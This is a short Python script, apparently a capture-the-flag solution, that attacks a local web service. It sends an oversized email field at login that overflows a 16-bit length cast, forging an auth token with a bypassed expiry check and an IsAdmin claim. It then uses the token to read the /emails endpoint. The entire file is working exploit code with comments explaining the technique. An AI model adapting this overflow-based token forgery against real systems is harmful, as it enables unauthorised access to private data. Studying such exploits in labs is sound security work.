import requests
OVERFLOW_START = "mc-fat@monke.zip" + "z"*8 +"t"

HEADER_SPLIT = 1024

TARGET = "http://127.0.0.1:1337"

def build_payload() -> dict[str,str]:
    # overflow the uint16 casting
    # -9 is so the length written for the email will only read "mc-fat@monke.zip"
    # 9 is the length of "zzzzzzzzt"
    # "zzzzzzzz" is 8825501086245354106 from little endian encoding to bypass the Expiry check
    # "t" at the end is to set the IsAdmin = true claim.
    payload = {
        "email": OVERFLOW_START + "A"*((1 << 16) - 9),
        "password": "anything"
    }
    return payload

def main():
    r = requests.post(TARGET + "/login", 
                      json=build_payload())
    token = r.json()["token"]
    print("token:", token)
    r = requests.get(TARGET + "/emails",
                     headers={"X-Auth-Token": token})
    print(r.text)

if __name__ == "__main__":
    main()